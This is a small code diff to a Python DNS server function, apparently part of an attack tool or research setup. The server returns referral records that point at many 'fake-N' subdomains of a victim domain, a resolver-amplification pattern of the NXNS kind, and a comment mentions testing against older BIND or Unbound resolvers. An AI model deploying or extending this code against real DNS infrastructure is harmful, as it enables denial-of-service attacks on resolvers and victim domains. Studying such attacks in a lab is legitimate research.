@@ -78,7 +78,8 @@ def dns_response(data, client_ip):
             reply.add_ar(RR(rname=attack_domain, rtype=QTYPE.NS, rclass=1, ttl=TTL, rdata=rdata))
 
         reply.add_auth(RR(rname=attack_domain, rtype=QTYPE.SOA, rclass=1, ttl=TTL, rdata=soa_record))
-
+    elif qn.startswith('fake'):
+        reply.header.rcode = 3
     elif qn.endswith('.' + attack_domain):  # NXDomain
         val = 0  # random.choice([0, 1])
         if val == 0:
@@ -87,7 +88,7 @@ def dns_response(data, client_ip):
                 referral_domain = DomainName('fake-' + str(i) + '.' + victim_domain)
                 reply.add_ar(RR(rname=referral_domain, rtype=QTYPE.A, rclass=1, ttl=TTL, rdata=A(IP2)))
         else:
-            reply.add_answer(RR(rname=qname, rtype=QTYPE.A, rclass=1, ttl=TTL, rdata=A(IP2)))
+            reply.add_answer(RR(rname=qname, rtype=QTYPE.A, rclass=1, ttl=TTL, rdata=A(IP)))
     print("---- Reply:\n", reply)
 
     # install BIND 9.11 or earlier/ Unbound/s
